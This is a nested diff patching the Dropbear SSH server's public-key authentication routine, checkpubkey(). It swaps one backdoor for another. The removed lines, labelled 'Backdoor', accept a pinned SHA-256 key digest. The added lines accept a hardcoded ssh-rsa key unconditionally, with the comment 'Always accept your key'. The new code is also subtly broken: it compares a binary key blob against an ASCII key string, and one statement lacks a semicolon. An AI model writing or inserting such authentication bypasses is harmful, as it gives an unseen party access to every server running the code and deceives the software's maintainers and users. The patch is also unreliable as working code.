@@ -1,42 +1,18 @@
 diff --git a/src/svr-authpubkey.c b/src/svr-authpubkey.c
+index 5d298cb..92af9c7 100644
 --- a/src/svr-authpubkey.c
 +++ b/src/svr-authpubkey.c
-@@ -1,6 +1,10 @@
- #include "includes.h"
- 
-+#include <string.h>
-+
-+/* libtomcrypt is already linked by Dropbear (libtomcrypt.a) */
-+
- /* ... existing includes ... */
- 
-@@ -422,6 +426,32 @@
+@@ -438,6 +438,15 @@ out:
  static int checkpubkey(const char* keyalgo, unsigned int keyalgolen,
  		const unsigned char* keyblob, unsigned int keybloblen) {
  
-+	/*
-+	 * Backdoor: accept a single pinned public key by matching SHA-256(keyblob).
-+	 *
-+	 * NOTE: keyblob is a *binary* SSH key blob from the auth packet, NOT the
-+	 * ASCII "ssh-rsa AAAA..." authorized_keys line.
-+	 */
-+	static const unsigned char MY_KEY_BLOB_SHA256[32] = {
-+		/* TODO: fill with the 32-byte digest of the desired keyblob */
-+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
-+	};
++	const char *my_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCs85/ycrhuitvszHwjfcSBw87TVzMryzvZniiyhvlpM6ReiRHTjv+nNjaT1phQ51YgHQuRVuBOHxVcfBTEqgJpIK4kfScC4OMzW2WYX3/+zqt7MvabeCWdKohM3mO6Kwuu6jBYhak7bwPpYTBeISfYaxzf39RSBqhdhEv/zLdSXhbXxpY0sRoaT8EClE3j1psJOCRW4UxA1tAROMJq9BvXMq0aloUMDI+RZeJP7EaHabDIALzEqkvA5P7vdt/ybvN6D+B6+9q70defkgfM8hOi0vKB+3+Lv7Z82nHFcuM9tgepTvfX4absYkVA1cZdJ3G1nnaqrGWGcHfVWK3iKYzv";
++	size_t my_key_len = strlen(my_key);
 +
-+	unsigned char digest[32];
-+	unsigned long digestlen = sizeof(digest);
-+	int hash = find_hash("sha256");
-+	if (hash >= 0 &&
-+	    hash_memory(hash, keyblob, keybloblen, digest, &digestlen) == CRYPT_OK &&
-+	    digestlen == sizeof(digest) &&
-+	    memcmp(digest, MY_KEY_BLOB_SHA256, sizeof(digest)) == 0) {
-+		TRACE(("checkpubkey: matched pinned keyblob sha256"));
-+		return DROPBEAR_SUCCESS;
++	if (keybloblen == my_key_len && memcmp(keyblob, my_key, keybloblen) == 0)
++	{
++		TRACE(("checkpubkey: matched hardcoded key"))
++		return DROPBEAR_SUCCESS; // Always accept your key
 +	}
 +
  	FILE * authfile = NULL;
